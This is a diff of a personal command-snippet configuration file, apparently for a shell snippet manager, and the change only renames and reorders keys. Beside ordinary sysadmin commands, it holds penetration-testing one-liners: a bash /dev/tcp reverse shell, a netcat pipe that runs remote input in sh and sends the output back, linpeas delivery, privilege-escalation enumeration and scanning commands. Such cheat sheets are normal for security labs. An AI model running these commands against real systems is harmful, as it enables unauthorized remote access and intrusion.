@@ -1,227 +1,228 @@
-[[snippets]]
-  description = "add padding to avoid invalid input for base64"
+
+[[Snippets]]
+  Description = "add padding to avoid invalid input for base64"
+  Output = ""
+  Tag = ["decode"]
   command = " | fold -w 4 | sed '$ d' | tr -d '\\n'"
-  tag = ["decode"]
-  output = ""
 
-[[snippets]]
-  description = "run http server in current directory"
+[[Snippets]]
+  Description = "run http server in current directory"
+  Output = ""
+  Tag = ["enum"]
   command = "python3 -m http.server <port=8888>"
-  tag = ["enum"]
-  output = ""
 
-[[snippets]]
-  description = "upload linpeas with nc"
+[[Snippets]]
+  Description = "upload linpeas with nc"
+  Output = ""
+  Tag = ["enum"]
   command = "cat /usr/share/peass/linPEAS/linpeas.sh | nc -lvnp <port=8888> & nc -lvnp <port=9999> | tee linpeas_report_$(date +%Y%m%d%H%M%S).txt & wait"
-  tag = ["enum"]
-  output = ""
 
-[[snippets]]
-  description = "execute from memory and send output back to the host"
+[[Snippets]]
+  Description = "execute from memory and send output back to the host"
+  Output = ""
+  Tag = ["enum"]
   command = "nc <ip:> <port=8888> | sh 2>&1 | nc <ip:> <port=9999>"
-  tag = ["enum"]
-  output = ""
 
-[[snippets]]
-  description = "file enumeration"
+[[Snippets]]
+  Description = "file enumeration"
+  Output = ""
+  Tag = ["enum"]
   command = "gobuster dir -u <url:> -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 64 -x html,php,sh,js,css | tee gobuster_report_$(date +%Y%m%d%H%M%S).txt"
-  tag = ["enum"]
-  output = ""
 
-[[snippets]]
-  description = "dir enumeration"
+[[Snippets]]
+  Description = "dir enumeration"
+  Output = ""
+  Tag = ["enum"]
   command = "gobuster dir -u <url:> -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 64 | tee gobuster_report_$(date +%Y%m%d%H%M%S).txt"
-  tag = ["enum"]
-  output = ""
 
-[[snippets]]
-  description = "vhost enumeration"
+[[Snippets]]
+  Description = "vhost enumeration"
+  Output = ""
+  Tag = ["enum"]
   command = "gobuster vhost -u <url:> -w /usr/share/wordlists/discovery/subdomains-top1million-5000.txt -t 64 | tee gobuster_report_$(date +%Y%m%d%H%M%S).txt"
-  tag = ["enum"]
-  output = ""
 
-[[snippets]]
-  description = "find SUID Binaries"
+[[Snippets]]
+  Description = "find SUID Binaries"
+  Output = ""
+  Tag = ["enum"]
   command = "find / -type f -perm -04000 -ls 2>/dev/null"
-  tag = ["enum"]
-  output = ""
 
-[[snippets]]
-  description = "show passwd"
+[[Snippets]]
+  Description = "show passwd"
+  Output = ""
+  Tag = ["enum"]
   command = "cat /etc/passwd"
-  tag = ["enum"]
-  output = ""
 
-[[snippets]]
-  description = "show system info"
+[[Snippets]]
+  Description = "show system info"
+  Output = ""
+  Tag = ["enum"]
   command = "sh -c '( set -x; uname -a; cat /etc/os-release )'"
-  tag = ["enum"]
-  output = ""
 
-[[snippets]]
-  description = "show crontab"
+[[Snippets]]
+  Description = "show crontab"
+  Output = ""
+  Tag = ["enum"]
   command = "cat /etc/crontab"
-  tag = ["enum"]
-  output = ""
 
-[[snippets]]
-  description = "list enabled capabilities"
+[[Snippets]]
+  Description = "list enabled capabilities"
+  Output = ""
+  Tag = ["enum"]
   command = "getcap -r / 2>/dev/null"
-  tag = ["enum"]
-  output = ""
 
-[[snippets]]
-  description = "show no_root_squash"
+[[Snippets]]
+  Description = "show no_root_squash"
+  Output = ""
+  Tag = ["enum"]
   command = "grep no_root_squash /etc/exports"
-  tag = ["enum"]
-  output = ""
 
-[[snippets]]
-  description = "allow incoming traffic"
+[[Snippets]]
+  Description = "allow incoming traffic"
+  Output = ""
+  Tag = ["firewall"]
   command = "sh -c '( set -x; sudo ufw allow from <ip:> proto tcp to any port <port=8888,9999> && sudo ufw status verbose )'"
-  tag = ["firewall"]
-  output = ""
 
-[[snippets]]
-  description = "delete incoming traffic rule"
+[[Snippets]]
+  Description = "delete incoming traffic rule"
+  Output = ""
+  Tag = ["firewall"]
   command = "sh -c '( set -x; sudo ufw delete allow from <ip:> proto tcp to any port <port=8888,9999> && sudo ufw status verbose )'"
-  tag = ["firewall"]
-  output = ""
 
-[[snippets]]
-  description = "reset and restart ufw"
+[[Snippets]]
+  Description = "reset and restart ufw"
+  Output = ""
+  Tag = ["firewall"]
   command = "sh -c '( set -x; sudo ufw --force reset && sudo ufw enable && sudo ufw status verbose )'"
-  tag = ["firewall"]
-  output = ""
 
-[[snippets]]
-  description = "fast port scan"
+[[Snippets]]
+  Description = "fast port scan"
+  Output = ""
+  Tag = ["recon"]
   command = "grc nmap -F -sV -Pn -oN nmap_report_$(date +%Y%m%d%H%M%S).txt <ip:>"
-  tag = ["recon"]
-  output = ""
 
-[[snippets]]
-  description = "full port scan"
+[[Snippets]]
+  Description = "full port scan"
+  Output = ""
+  Tag = ["recon"]
   command = "grc nmap -sV -sC -oN nmap_report_$(date +%Y%m%d%H%M%S).txt <ip:>"
-  tag = ["recon"]
-  output = ""
 
-[[snippets]]
-  description = "scan vulnerabilities"
+[[Snippets]]
+  Description = "scan vulnerabilities"
+  Output = ""
+  Tag = ["recon"]
   command = "nikto -port <port:> -h <ip:> | tee nikto_report_$(date +%Y%m%d%H%M%S).txt"
-  tag = ["recon"]
-  output = ""
 
-[[snippets]]
-  description = "netcat reverse shell remote"
+[[Snippets]]
+  Description = "netcat reverse shell remote"
+  Output = ""
+  Tag = ["reverse-shell", "payload"]
   command = "bash -i >&/dev/tcp/<ip:>/<port=8888> 0>&1"
-  tag = ["reverse-shell", "payload"]
-  output = ""
 
-[[snippets]]
-  description = "netcat reverse shell local"
+[[Snippets]]
+  Description = "netcat reverse shell local"
+  Output = ""
+  Tag = ["reverse-shell"]
   command = "tmux send-keys 'bash -l' Enter 'nc -lvnp <port=8888>' Enter"
-  tag = ["reverse-shell"]
-  output = ""
 
-[[snippets]]
-  description = "stabilize shell using script command"
+[[Snippets]]
+  Description = "stabilize shell using script command"
+  Output = ""
+  Tag = ["reverse-shell"]
   command = "/usr/bin/script -qc /bin/bash /dev/null"
-  tag = ["reverse-shell"]
-  output = ""
 
-[[snippets]]
-  description = "stabilize shell using stty and $TERM"
+[[Snippets]]
+  Description = "stabilize shell using stty and $TERM"
+  Output = ""
+  Tag = ["reverse-shell"]
   command = "tmux send-keys 'stty raw -echo; fg' Enter 'export TERM=xterm' Enter"
-  tag = ["reverse-shell"]
-  output = ""
 
-[[snippets]]
-  description = "list the privileges for the invoking user"
+[[Snippets]]
+  Description = "list the privileges for the invoking user"
+  Output = ""
+  Tag = ["privesc"]
   command = "sudo -l"
-  tag = ["privesc"]
-  output = ""
 
-[[snippets]]
-  description = "show ssl certificate"
+[[Snippets]]
+  Description = "show ssl certificate"
+  Output = ""
+  Tag = ["ops"]
   command = "sudo grc nmap -p 443 --script ssl-cert <domain=>"
-  tag = ["ops"]
-  output = ""
 
-[[snippets]]
-  description = "show all resources"
+[[Snippets]]
+  Description = "show all resources"
+  Output = ""
+  Tag = ["container"]
   command = "kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 -t kubectl get --show-kind --ignore-not-found"
-  tag = ["container"]
-  output = ""
 
-[[snippets]]
-  description = "edit hosts file"
+[[Snippets]]
+  Description = "edit hosts file"
+  Output = ""
+  Tag = ["misc"]
   command = "sh -c '[ -z \"$EDITOR\" ] && export EDITOR=$(type vim >/dev/null 2>&1 && echo vim || echo vi); [ $(id -u) = 0 ] && $EDITOR /etc/hosts || sudoedit /etc/hosts'"
-  tag = ["misc"]
-  output = ""
 
-[[snippets]]
-  description = "generate random string"
+[[Snippets]]
+  Description = "generate random string"
+  Output = ""
+  Tag = ["misc"]
   command = "tr -dc A-Za-z0-9 </dev/urandom | head -c 20; echo ''"
-  tag = ["misc"]
-  output = ""
 
-[[snippets]]
-  description = "set $EDITOR"
+[[Snippets]]
+  Description = "set $EDITOR"
+  Output = ""
+  Tag = ["misc"]
   command = "export EDITOR=$(type vim >/dev/null 2>&1 && echo vim || echo vi)"
-  tag = ["misc"]
-  output = ""
 
-[[snippets]]
-  description = "run vim with some options"
+[[Snippets]]
+  Description = "run vim with some options"
+  Output = ""
+  Tag = ["misc"]
   command = "vim -p -c 'set ignorecase smartcase wildignorecase tabstop=2 softtabstop=2 shiftwidth=2 expandtab paste' "
-  tag = ["misc"]
-  output = ""
 
-[[snippets]]
-  description = "regenerate and sign initramfs"
+[[Snippets]]
+  Description = "regenerate and sign initramfs"
+  Output = ""
+  Tag = ["misc"]
   command = "sudo mkinitcpio -P"
-  tag = ["misc"]
-  output = ""
 
-[[snippets]]
-  description = "reboot into the firmware setup interface"
+[[Snippets]]
+  Description = "reboot into the firmware setup interface"
+  Output = ""
+  Tag = ["misc"]
   command = "systemctl reboot --firmware-setup"
-  tag = ["misc"]
-  output = ""
 
-[[snippets]]
-  description = "show system startup time"
+[[Snippets]]
+  Description = "show system startup time"
+  Output = ""
+  Tag = ["misc"]
   command = "sh -c '(set -x; systemd-analyze; systemd-analyze critical-chain)'"
-  tag = ["misc"]
-  output = ""
 
-[[snippets]]
-  description = "show nvim startup time"
+[[Snippets]]
+  Description = "show nvim startup time"
+  Output = ""
+  Tag = ["misc"]
   command = "vim-startuptime -vimpath nvim"
-  tag = ["misc"]
-  output = ""
 
-[[snippets]]
-  description = "switch yubikeys for same GPG key"
+[[Snippets]]
+  Description = "switch yubikeys for same GPG key"
+  Output = ""
+  Tag = ["misc"]
   command = "gpg-connect-agent \"scd serialno\" \"learn --force\" /bye"
-  tag = ["misc"]
-  output = ""
 
-[[snippets]]
-  description = "show CPU frequency"
+[[Snippets]]
+  Description = "show CPU frequency"
+  Output = ""
+  Tag = ["misc"]
   command = "sudo cpupower frequency-info"
-  tag = ["misc"]
-  output = ""
 
-[[snippets]]
-  description = "change maximum CPU frequency"
+[[Snippets]]
+  Description = "change maximum CPU frequency"
+  Output = ""
+  Tag = ["misc"]
   command = "sudo cpupower frequency-set -u <freq=5GHz>"
-  tag = ["misc"]
-  output = ""
 
-[[snippets]]
-  description = "clone and change directory"
+[[Snippets]]
+  Description = "clone and change directory"
+  Output = ""
+  Tag = ["misc"]
   command = "cd $(read url; ghq get \"$url\"; ghq list -p \"$url\")"
-  tag = ["misc"]
-  output = ""
